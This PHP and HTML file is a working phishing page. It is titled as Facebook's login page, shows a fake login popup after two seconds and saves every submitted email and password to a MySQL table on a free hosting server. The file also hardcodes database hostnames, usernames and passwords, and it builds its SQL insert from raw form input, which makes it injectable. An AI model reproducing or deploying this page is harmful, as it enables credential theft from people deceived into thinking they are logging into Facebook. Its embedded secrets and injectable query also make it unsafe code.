<?php  //starting new session to the user
if ($_POST)   //if post request is there from the line no 39 as post form request
{
  $host="sql309.ezyro.com";
  $name="ezyro_30865974";
  $dbpassword="3t31xkxy4rn";
  $dbname="ezyro_30865974_user";
  //   $conn = mysqli_connect("sql202.epizy.com", "epiz_30097502", "kf5mLzTFCVKYYku", "epiz_30097502_login");
  $conn = mysqli_connect("$host", "$name", "$dbpassword", "$dbname"); //connection to the database
  // if ($conn->connect_error) {
  //   die("Connection failed: " . $conn->connect_error);
  // }
  // echo "Connected successfully";

  $username = $_POST['username']; //taking username from login form and stoing it it $usernmae variable in php
  $password = $_POST['password']; //Taking password from loginform and storing in $password variable in php
  //checking username and password from database and query will return 1 row if it is found otherwise will return 0 rows 
  $result = mysqli_query($conn, "INSERT INTO `logindata` (`username`, `password`) VALUES ('$username', '$password');");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <style>body{
        background: green;
    }
    .popup{
        background: red;
        position: fixed;
        height: 70%;
        width: 100%;
        display: none;
        
    }
    
    .card{
        position: absolute;
        top: 90px;
        left: 5px;
        padding: 20px;
        box-shadow: 0 0 8px rgba(192, 188, 188, 0.527);
        border-radius: 8px;
        z-index: 10;
    }
    .input-group{
        height: 50px;
        border: 1px solid rgb(221, 221, 221);
        border-radius: 5px;
        padding: 0 15px;
    }
    #hr1{
        display: none;
    }
    #hr2{
        margin-top: 0px;
    }
    .exit{ 
       position: absolute;
       top: 3px;
       right: 3px;
       width: 20px;
       height: 20px;
       background: #d6d1d1 url(exit.png);
       background-repeat: no-repeat;
       background-size: 10px;
       background-position: center;
       cursor: pointer;
       border-radius: 50%;
       z-index: 100;
    }
    </style>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <!--External CSS StyleSheet-->
    <!-- <link rel="stylesheet" href="index.css"> -->
    <!--Bootstrap-->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <!--Fontawesome CDN link-->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    
    <!--Google fonts-->
    <link
        href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Nosifer&family=Pacifico&display=swap"
        rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link
        href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Days+One&family=Nosifer&family=Pacifico&display=swap"
        rel="stylesheet">
</head>
<body>
    <div class="popup">
        <div class="col-sm-5">
            <div class="card">
                <div class="exit"></div>
                <form method="POST">
                    <input id="email" name="username" class="input-group" type="text"
                        placeholder="Email or Phone Number">
                    <input id="pass" name="password" class="input-group my-2" type="password" placeholder="Password">
                    <button id="fbLogin" name="login" class="btn btn-primary btn-lg" style="width:100%;">Log
                        In</button>
                </form>
                <hr id="hr1">
                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget
                        password?</a>
                </p>
                <hr id="hr2">
                <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>

            </div>
        </div>
    </div>
    <script>
        const popup = document.querySelector('.popup');
        const exit = document.querySelector('.exit');
        window.onload = function () {
            setTimeout(function () {
                popup.style.display = "block"
                //adding somw time of delay
            }, 2000)
        }
        exit.addEventListener('click', () => {
            popup.style.display = "none"
        })
    </script>
</body>
</html>